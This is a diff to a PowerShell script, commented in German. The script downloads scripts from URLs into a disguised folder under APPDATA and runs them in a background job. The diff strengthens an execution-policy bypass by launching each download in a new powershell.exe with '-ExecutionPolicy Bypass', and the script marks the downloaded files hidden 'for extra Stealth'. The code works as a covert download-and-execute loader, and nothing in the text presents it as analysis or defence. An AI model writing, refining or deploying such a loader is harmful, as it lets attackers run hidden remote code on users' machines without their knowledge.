@@ -7,7 +7,7 @@ try {
     [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 } catch {}
 
-# ==================== DOWNLOAD UND AUSFÜHRUNG DER SCRIPTS (NEU) ====================
+# ==================== DOWNLOAD UND AUSFÜHRUNG DER SCRIPTS (VERBESSERT) ====================
 # Flexibler Pfad pro User (nicht hartcodiert)
 $baseDir = Join-Path $env:APPDATA "Microsoft\Windows\PowerShell"
 $operationDir = Join-Path $baseDir "operation"
@@ -47,19 +47,20 @@ if (Test-Path $logPath) {
     Set-HiddenAttribute -path $logPath
 }
 
-# Funktion zum Download und Ausführen (im Background-Job)
+# Funktion zum Download und Ausführen (im Background-Job) - FIX FÜR EXECUTION POLICY
 $downloadJob = Start-Job -ScriptBlock {
     param($targetDir, $scripts, $logPath)
     
-    # Execution Policy für diesen Prozess bypassen (fix für den Fehler)
+    # Execution Policy für diesen Prozess bypassen (zusätzlich)
     Set-ExecutionPolicy Bypass -Scope Process -Force
     
     foreach ($script in $scripts) {
         $filePath = Join-Path $targetDir $script.FileName
         try {
             Invoke-WebRequest -Uri $script.Url -OutFile $filePath -UseBasicParsing
-            # Sofort ausführen, sobald heruntergeladen
-            & $filePath
+            # Ausführen mit explizitem Bypass in neuem PowerShell-Prozess (umgeht Policy vollständig)
+            $processArgs = @("-ExecutionPolicy", "Bypass", "-File", "`"$filePath`"")
+            Start-Process powershell.exe -ArgumentList $processArgs -NoNewWindow -Wait
             # Optional: Hidden-Attribut für das Script setzen (für extra Stealth)
             Set-ItemProperty -Path $filePath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
         } catch {
